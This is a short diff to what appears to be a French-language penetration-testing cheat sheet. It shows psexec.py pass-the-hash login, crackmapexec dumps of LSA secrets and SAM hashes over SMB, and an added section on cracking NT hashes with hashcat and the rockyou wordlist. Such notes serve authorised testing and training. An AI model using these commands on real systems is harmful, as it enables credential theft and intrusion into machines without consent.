@@ -25,3 +25,14 @@ psexec.py Administratur@$TARGET_IP -hashes :xxxxxxxxxxxxxxxxxxxxxxx
 crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --lsa
 crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --sam
 ```
+
+## Cassage des hash NT avec hashcat
+
+```
+cat hash.txt
+64f12cddaa88057e06a81b54e73b949b
+31d6cfe0d16ae931b73c59d7e0c089c0
+...
+
+sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
+```
